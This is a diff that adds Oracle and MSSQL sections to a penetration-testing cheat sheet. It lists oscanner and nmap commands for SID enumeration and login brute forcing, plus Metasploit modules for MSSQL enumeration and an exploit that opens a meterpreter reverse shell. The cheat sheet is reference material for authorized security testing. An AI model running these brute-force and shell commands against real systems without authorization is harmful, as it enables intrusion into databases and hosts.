@@ -22,6 +22,9 @@ This penetration cheat sheet should be used as a quick reference overview for va
     - [TLS and SSL Testing](#tls-and-ssl-testing)        
 - [Penetration Tests](#penetration-tests)
     - [Database Penetration](#database-penetration)
+        - [Oracle](#oracle)
+        - [MSSQL](#mssql)    
+- [Network](#network)
 
 
 # Pre-engagement
@@ -137,3 +140,34 @@ Test all options on a single host and output to a .html file.
 # Penetration Tests
 
 ## Database Penetration
+
+### Oracle
+
+`apt-get install oscanner`    
+`oscanner -s 192.168.1.200 -P 1521`   
+Install and Run OScanner for SID Enumeration, Password tests, Version, Accounts, Audits, policies.
+
+`nmap --script=oracle-tns-version`   
+Fingerprint / get Oracle TNS version.
+
+`nmap -p 1521 -A TARGET`   
+Run nmap against oracle TNS.
+
+`nmap --script=oracle-sid-brute`   
+`nmap --script=oracle-brute`   
+Identify default Oracle users. Login to continue the oracle privilege escalation.
+
+### MSSQL
+
+`nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156`   
+`msf > use auxiliary/scanner/mssql/mssql_ping`   
+Use nmap or METASPLOIT for MSSQL Enumeration.
+
+`msf > use auxiliary/admin/mssql/mssql_enum`
+Bruteforce MSSQL Login.
+
+`msf > use exploit/windows/mssql/mssql_payload`   
+`msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp` 
+Metasploit MSSQL Shell.
+
+# Network
